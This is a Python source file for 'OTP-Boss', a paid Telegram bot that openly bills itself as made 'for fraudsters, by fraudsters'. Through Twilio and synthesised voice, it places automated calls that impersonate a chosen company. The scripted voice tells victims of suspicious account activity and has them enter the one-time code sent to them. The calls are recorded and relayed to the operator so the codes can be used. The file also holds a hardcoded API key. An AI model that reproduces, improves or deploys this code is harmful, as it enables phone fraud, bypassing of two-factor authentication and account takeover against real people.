import telebot,json, os
from flask import Flask, request
from twilio.rest import Client
from telebot import types
from requests.auth import HTTPBasicAuth
from datetime import datetime
from datetime import date
from datetime import timedelta  
import requests
import re

raw_config = json.loads(open('./conf/settings.txt', 'r').read())

bot_token = raw_config['bot_token']
account_sid = raw_config['account_sid']
auth_token = raw_config['auth_token']
ngrok = raw_config['ngrok_url']
phone_numz = raw_config['Twilio Phone Number']

client = Client(account_sid, auth_token)
bot = telebot.TeleBot(bot_token)  

def check_subscription(idkey):
    subscription = open('./conf/'+idkey+'/subs.txt', 'r').read()
    idmember = subscription
    idmember = datetime.strptime(idmember, '%d/%m/%Y')
    if idmember < datetime.now():
        return "EXPIRED"
    else:
        return "ACTIVE"

def validate_phone_number(phonenum):
    """Validate phone number - must start with + and have 10+ digits"""
    pattern = r'^\+\d{10,}$'
    return re.match(pattern, phonenum) is not None

def generate_ai(iduser,text,page):
    headers = {
    'accept': 'audio/mpeg',
    'xi-api-key': 'f343277da36e000924585730b1a3f91e',
    'Content-Type': 'application/json',
    }

    json_data = {
    'text': text,
    'voice_settings': {
        'stability': 1,
        'similarity_boost': 1,
    },
    }
    botai = requests.post('https://api.elevenlabs.io/v1/text-to-speech/21m00Tcm4TlvDq8ikWAM', headers=headers, json=json_data)
    open(f"./conf/{iduser}/{page}.mp3",   'wb').write(botai.content)


@bot.message_handler(commands=['help'])
def help_command(pm):
    help_text = """
🤖 **OTP-Boss Bot User Guide**:  
Below are the basic commands of the bot and their descriptions:  

🔑 /check: Check your subscription status.  
📞 /call [Phone Number] [Name] [Code] [Company Name]: Initiate a call with the specified details.  
🔄 /add_subs [User ID] [Number of Days]: Add a subscription to the specified user (Admin only).  
⚙️ /clearset: Reset the current settings of the bot.  
🎙️ /start: Start the bot and create your subscription information.  

💡 For more information, please contact @YOUR_TG_NAME.  
"""
    safe_text = help_text.replace("_", "\\_").replace("*", "\\*").replace("[", "\\[").replace("]", "\\]").replace("(", "\\(").replace(")", "\\)").replace(".", "\\.").replace("-", "\\-")
    
    bot.send_message(pm.chat.id, safe_text, parse_mode="MarkdownV2")


@bot.message_handler(commands=['subscription_info'])
def subscription_info(pm):
    iduser = pm.from_user.id
    if check_subscription(str(iduser)) == "ACTIVE":
        expiry_date = open(f'./conf/{iduser}/subs.txt', 'r').read()
        bot.send_message(
            pm.chat.id,
            f"✅ **Subscription Status**: Active\n📅 **Exp Date**: {expiry_date}\n\nWe wish you a pleasant use!",
            parse_mode="Markdown"
        )
    else:
        bot.send_message(
            pm.chat.id,
            "❌ Subscription Status: Passive\n\nPlease contact @YOUR_TG_NAME to purchase a subscription.",
            parse_mode="Markdown"
        )


@bot.message_handler(commands=['manage_subscription'])
def manage_subscription(pm):
    iduser = pm.from_user.id
    buttons = types.InlineKeyboardMarkup(row_width=2)
    btn_extend = types.InlineKeyboardButton("📅 Extend Subscription", callback_data="extend_subscription")
    btn_info = types.InlineKeyboardButton("ℹ️ Subscription Info", callback_data="subscription_info")
    buttons.add(btn_extend, btn_info)
    bot.send_message(
        pm.chat.id,
        "🔑 Subscription Management\n\nPlease select the action you want to take.",
        reply_markup=buttons,
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data == "extend_subscription")
def extend_subscription(call):
    bot.send_message(
        call.message.chat.id,
        "📞 Please contact @YOUR_TG_NAME to extend your subscription."
    )

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    bot.send_message(call.message.chat.id, text='ℹ️ 𝗟𝗢𝗔𝗗𝗜𝗡𝗚 𝗩𝗢𝗜𝗖𝗘 𝗦𝗖𝗥𝗜𝗣𝗧 ')
    iduser = call.from_user.id
    bot.send_message(call.message.chat.id, text='Please wait... ⏳')
    generate_ai(str(iduser), f"Hello! , im Kristina from {open('./conf/'+str(iduser)+'/Company Name.txt', 'r').read()}. To ensure that I am speaking to {open('./conf/'+str(iduser)+'/Name.txt', 'r').read()}, I would kindly ask you to press 1 on your phone's keypad.","checkifhuman")
    generate_ai(str(iduser), f"Thank you.. for confirming your identity, {open('./conf/'+str(iduser)+'/Name.txt', 'r').read()}. I am contacting you today because we have noticed some unusual activity on your account that we would like to bring to your attention. In order to verify that this is indeed you and not someone else attempting to access your account, we would like to conduct a verification session. This session will involve answering a few questions related to your account, and may also include providing us with a code that we will provide to you.","explain")
    generate_ai(str(iduser), f"Please enter the {open('./conf/'+str(iduser)+'/Digits.txt', 'r').read()} digits code that we have sent to you by using the keypad or dialpad", "askdigits")
    bot.send_message(call.message.chat.id, text='✅ 𝗩𝗢𝗜𝗖𝗘 𝗦𝗖𝗥𝗜𝗣𝗧 𝗟𝗢𝗔𝗗𝗘𝗗\nPlease wait... ⏳')
    pisahin = call.data.split("|")
    if pisahin[0] == "callv":
        caller = client.calls.create(
            machine_detection='DetectMessageEnd',
            record=True,
            url=f'{ngrok}/voice?chat_id={call.message.chat.id}&user_id={iduser}',
            to=f'{pisahin[2]}',
            from_=f'{phone_numz}'
            )
        sid = caller.sid
        print(sid)
        a = 0
        b = 0
        c = 0
        d = 0
        e = 0        
        while True:
            if client.calls(sid).fetch().status == 'ringing':
                if not a >= 1:
                    bot.send_message(call.message.chat.id, text='ℹ️ Call Status : Ringing')
                    a = a + 1
            elif client.calls(sid).fetch().status == 'machine_end_beep':
                if not b >= 1:
                    bot.send_message(call.message.chat.id, text='ℹ️ Call Status : Voice Mail')
                    break
                    b = b + 1 
            elif client.calls(sid).fetch().status == 'in-progress':    
                if not c >= 1:
                    bot.send_message(call.message.chat.id, text='ℹ️ Call Status : Call has been answered')
                    c = c + 1 
            elif client.calls(sid).fetch().status == 'completed':
                url = f"https://api.twilio.com/2010-04-01/Accounts/AC88463b64bd6c09ec64af4440fa6b5f5a/Recordings/{sid}"
                r = requests.get(url,auth = HTTPBasicAuth(account_sid, auth_token))
                open(f'./conf/{iduser}/record.mp3',   'wb').write(r.content)
                bot.send_message(call.message.chat.id, text='️ Call Status : Completed')
                file_data = open(f'./conf/{iduser}/record.mp3', 'rb')
                bot.send_audio(call.message.chat.id, file_data)
                break
            elif client.calls(sid).fetch().status == 'failed':
                bot.send_message(call.message.chat.id, text='ℹ️ Call Status : Failed')
                break
            elif client.calls(sid).fetch().status == 'no-answer':
                bot.send_message(call.message.chat.id, text='ℹ️ Call Status : No Answer')
                break
            elif client.calls(sid).fetch().status == 'canceled':
                bot.send_message(call.message.chat.id, text='ℹ️ Call Status : Canceled')
                break
            elif client.calls(sid).fetch().status == 'busy':
                bot.send_message(call.message.chat.id, text='ℹ️ Call Status : Busy')
                break                        
            else:
                print(client.calls(sid).fetch().status)


    elif call.data == "hangupv":
        calls = client.calls.list(limit=1)
        for record in calls:
            call = client.calls(record.sid).update(status='completed')

    elif call.data == "denyotp":
        calls = client.calls.list(limit=1)
        for record in calls:    
            call = client.calls(record.sid).update(method='POST',url=f'{ngrok}/denyotp?chat_id={call.message.chat.id}&user_id={call.from_user.id}')

    elif call.data == "acceptotp":
        calls = client.calls.list(limit=1)
        for record in calls:
            call = client.calls(record.sid).update(method='POST',url=f'{ngrok}/acceptotp?chat_id={call.message.chat.id}&user_id={call.from_user.id}')  

    elif call.data == "clearset":
        open("./conf/"+str(iduser)+"/phonenum.txt", "w").close()
        open("./conf/"+str(iduser)+"/Name.txt", "w").close()
        open("./conf/"+str(iduser)+"/Digits.txt", "w").close()
        open("./conf/"+str(iduser)+"/Company Name.txt", "w").close()
        bot.send_message(call.message.chat.id, text='Success Clearing')

@bot.message_handler(commands=['call'])
def custom_call_handler(pm):
    try:
        args = pm.text.split(" ")
        if len(args) < 5:
            bot.send_message(
                pm.chat.id,
                "❌ You entered a missing or incorrect command!\n\nCorrect format: `/call [Phone Number] [Name] [Code] [Company Name]`\n\nExample: `/call +1234567890 John 123456 Acme Corp`",
                parse_mode="Markdown"
            )
            return
        phonenum, name, digits, companyz = args[1], args[2], args[3], " ".join(args[4:])
        
        if not validate_phone_number(phonenum):
            bot.send_message(pm.chat.id, "❌ Invalid phone number format!\n\nPhone number must start with + and contain 10+ digits.\nExample: +1234567890")
            return
        
        open(f'./conf/{pm.from_user.id}/Digits.txt', 'w').write(digits)
        open(f'./conf/{pm.from_user.id}/Name.txt', 'w').write(name)
        open(f'./conf/{pm.from_user.id}/Company Name.txt', 'w').write(companyz)
        
        bot.send_message(
            pm.chat.id,
            f"🟣 Initiating a Call...\n\n👤 Name: {name}\n📞 Phone: {phonenum}\n🔑 Code: {digits}\n🏢 Company: {companyz}"
        )

    except Exception as e:
        bot.send_message(pm.chat.id, f"❌ An error has occurred: {str(e)}")


@bot.message_handler(commands=['check'])
def check_bisa(pm):
    iduser = pm.from_user.id
    if check_subscription(str(iduser)) == "ACTIVE":
        bot.send_message(pm.chat.id, f" 🔑 𝗬𝗼𝘂𝗿 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗶𝘀 𝗰𝘂𝗿𝗿𝗲𝗻𝘁𝗹𝘆 : 𝘌𝘕𝘈𝘉𝘓𝘌𝘋 ✅\n\n 🆔 𝗬𝗼𝘂𝗿 𝗜𝗗 : {iduser}")
    else:
        bot.send_message(pm.chat.id, f" 🔑 𝗬𝗼𝘂𝗿 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗶𝘀 𝗰𝘂𝗿𝗿𝗲𝗻𝘁𝗹𝘆 : 𝘋𝘐𝘚𝘈𝘉𝘓𝘌𝘋 ❌\n\n 💬 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗼𝘄𝗻𝗲𝗿 𝘁𝗼 𝗯𝘂𝘺 𝗮𝗰𝗰𝗲𝘀𝘴 : @YOUR_TG_NAME\n\n 🆔 𝗬𝗼𝘂𝗿 𝗜𝗗 : {iduser}")    

@bot.message_handler(commands=['start'])
def start_sz(pm):
    today = date.today()
    iduser = pm.from_user.id
    path = "./conf/"+str(iduser)
    isExist = os.path.exists(path)
    bot.send_message(pm.chat.id, f" 🤖 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗢𝗧𝗣-𝗕𝗼𝘀𝘀!\n\n𝟏 𝐝𝐚𝐲 > 𝟐𝟓$\n𝟭 𝘄𝗲𝗲𝗸 > 𝟭𝟲𝟬$\n𝗟𝗶𝗳𝗲𝘁𝗶𝗺𝗲 > 𝟵𝟬𝟬$\n\n 🔗 𝗝𝗼𝗶𝗻 𝘂𝘴 > https://t.me/YOUR_CHANNEL_URL\n\n 🔑 𝘊𝘩𝘦𝘤𝘬 𝘺𝘰𝘶𝘳 𝘴𝘶𝘣𝘴𝘤𝘳𝘪𝘱𝘵𝘪𝘰𝘯 𝘣𝘺 𝘶𝘴𝘪𝘯𝘨 : /check\n\n\n𝙈𝙖𝙙𝙚 𝙬𝙞𝙩𝙝 ❤️ 𝙛𝙤𝙧 𝙛𝙧𝙖𝙪𝙙𝙨𝙩𝙚𝙧𝙨, 𝙗𝙮 𝙛𝙧𝙖𝙪𝙙𝙨𝙩𝙚𝙧𝙨.\n𝙊𝙬𝙣𝙚𝙧 : @YOUR_TG_NAME")
    if not isExist:
        os.makedirs(path)
        open(f'./conf/{iduser}/subs.txt', 'w').write(f'{today.strftime("%d/%m/%Y")}')

@bot.message_handler(commands=['add_subs'])
def add_subs(pm):
    try:
        command_text = pm.text.strip()
        command_parts = command_text.split(" ")

        if len(command_parts) < 3:
            bot.send_message(
                pm.chat.id,
                "❌ Invalid command!\n\nCorrect format: `/add_subs [User ID] [Number of Days]`",
                parse_mode="Markdown"
            )
            return

        user_id = command_parts[1]
        days = command_parts[2]

        if not days.isdigit():
            bot.send_message(pm.chat.id, "❌ The number of days must be a valid number!")
            return

        new_expiration = datetime.now() + timedelta(days=int(days))
        expiration_date_str = new_expiration.strftime("%d/%m/%Y")

        user_config_path = f'./conf/{user_id}'
        if not os.path.exists(user_config_path):
            bot.send_message(pm.chat.id, f"❌ User ID not found: {user_id}")
            return

        subscription_file_path = f'{user_config_path}/subs.txt'
        with open(subscription_file_path, 'w') as subscription_file:
            subscription_file.write(expiration_date_str)

        bot.send_message(
            pm.chat.id,
            f"✅ Success!\n\nUser ID: {user_id}\nNew Subscription Expiration: {expiration_date_str}"
        )
    except Exception as e:
        bot.send_message(
            pm.chat.id,
            f"❌ An error occurred: {str(e)}"
        )


bot.polling()